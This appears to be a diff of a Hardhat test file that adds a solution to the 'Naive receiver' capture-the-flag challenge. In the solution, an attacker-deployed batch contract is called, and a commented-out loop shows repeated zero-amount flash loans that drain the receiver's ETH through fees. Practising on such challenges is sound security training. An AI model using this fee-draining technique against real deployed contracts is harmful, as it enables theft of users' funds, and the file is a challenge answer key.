@@ -2,7 +2,7 @@ const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] Naive receiver', function () {
-    let deployer, user, attacker;
+    let deployer, user, attacker, batcher;
 
     // Pool has 1000 ETH in balance
     const ETHER_IN_POOL = ethers.utils.parseEther('1000');
@@ -16,6 +16,7 @@ describe('[Challenge] Naive receiver', function () {
 
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
+        const BatchContractFactory = await ethers.getContractFactory('BatchContract', attacker);
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
@@ -27,10 +28,20 @@ describe('[Challenge] Naive receiver', function () {
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
         
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+
+        this.batcher = await BatchContractFactory.deploy(this.pool.address);
+
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        /** This works, but need to make it one transaction */
+        // for( let i = 0; i < 10; i++) {
+        //     await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
+        // }
+
+        await this.batcher.connect(attacker).attack(this.receiver.address);
+    
     });
 
     after(async function () {
